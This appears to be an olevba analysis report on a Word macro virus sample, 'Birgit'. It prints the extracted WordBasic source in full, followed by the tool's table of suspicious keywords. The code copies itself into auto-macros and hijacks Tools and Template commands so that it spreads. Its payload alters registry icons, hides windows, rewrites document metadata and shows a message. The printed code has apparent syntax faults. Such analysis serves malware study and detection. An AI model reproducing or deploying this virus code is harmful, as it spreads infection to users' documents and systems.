olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Birgit
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Birgit - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Intended.Birgit - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'****************************************
'* ULTRAS CONSTRUCTION KIT FOR WORD 7.0 *
'*            Version 1.0               *
'****************************************
'Name Macro Virus: "W97M.Birgit.A"
'************************************************************
'* AutoOpen macro                                           *
'************************************************************
Sub AutoOpen()
On Error Resume Next
uCkAo$ = filename$() + ":AutoOpen"
uCkAc$ = "AutoClose"
uCkAx$ = "AutoExec"
uCkAn$ = "AutoNew"
uCkAe$ = "AutoExit"
uCkTm$ = "ToolsMacro"
uCkFt$ = "FileTemplates"
uCkTc$ = "ToolsCustomize"
MacroCopy uCkAc$, uCkAo$
MacroCopy uCkAx$, uCkAo$
MacroCopy uCkAn$, uCkAo$
MacroCopy uCkAe$, uCkAo$
MacroCopy uCkTm$, uCkAo$
MacroCopy uCkFt$, uCkAo$
MacroCopy uCkTc$, uCkAo$
FileSaveAs .Format = 1
MacroCopy uCkAc$, uCkAo$
MacroCopy uCkAx$, uCkAo$
MacroCopy uCkAn$, uCkAo$
MacroCopy uCkAe$, uCkAo$
MacroCopy uCkTm$, uCkAo$
MacroCopy uCkFt$, uCkAo$
MacroCopy uCkTc$, uCkAo$
FileSave
Payload
End Sub
Sub Payload()
U = Int(Rnd() * 30) + 1
If Day(Now()) = U Then
    SetPrivateProfileString "HKEY_CLASSES_ROOT\WORD.DOCUMENT.6\DefaultIcon\", "", "C:\Windows\System\Shell32.dll,31", ""
    SetPrivateProfileString "HKEY_CLASSES_ROOT\Word.Template\DefaultIcon\", "", "C:\Windows\System\Shell32.dll,32", ""
AppHide ("Program Manager")
FileSummaryInfo Author:= = "Doctor Rave"
FileSummaryInfo Subject:="Virus"
FileSummaryInfo Title:="W97M.Birgit.A"
FileSummaryInfo Keywords:=""
FileSummaryInfo Comments:="Infected"
MsgBox ("This Virus is dedicated to Birgit R*B*T*C*E*"), ("W97M.Birgit.A")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

